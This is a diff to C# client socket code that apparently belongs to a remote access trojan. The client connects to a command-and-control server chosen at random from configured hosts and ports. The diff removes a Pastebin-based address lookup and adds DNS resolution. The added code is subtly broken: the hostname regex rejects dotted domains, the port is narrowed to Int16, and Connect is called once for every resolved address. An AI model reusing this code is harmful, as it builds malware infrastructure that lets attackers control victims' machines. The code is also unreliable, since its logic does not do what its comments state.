@@ -44,21 +44,28 @@ namespace Client.Sockets
                 };
                 if (Settings.Pastebin == "null")
                 {
-                    Client.Connect(Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]),
-    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
-                }
-                else
-                {
-                    using (WebClient wc = new WebClient())
+                    Regex r = new Regex("^[a-zA-Z0-9]*$");
+                    string ServerIP = Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]);
+                    Int16 ServerPort = Convert.ToInt16(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]);
+
+
+                    if (r.IsMatch(ServerIP)) //check if the address is alphanumric (meaning its a domain)
                     {
-                        NetworkCredential networkCredential = new NetworkCredential("", "");
-                        wc.Credentials = networkCredential;
-                        string resp = wc.DownloadString(Settings.Pastebin);
-                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
-                        Settings.Hosts = spl[0];
-                        Settings.Ports = spl[new Random().Next(1, spl.Length)];
-                        Client.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
+                        IPAddress[] addresslist = Dns.GetHostAddresses(ServerIP); //get all IP's connected to that domain
+
+                        foreach (IPAddress theaddress in addresslist) //we do a foreach becasue a domain can lead to multiple IP's
+                        {
+                            Client.Connect(theaddress, ServerPort); //lets try and connect!
+                        }
                     }
+                    else
+                    {
+                        Client.Connect(ServerIP, ServerPort); //legacy mode connect (no DNS)
+                    }
+                    
+
+                    //Client.Connect(Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]),
+                    // Convert.ToInt16(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                 }
 
                 Debug.WriteLine("Connected!");
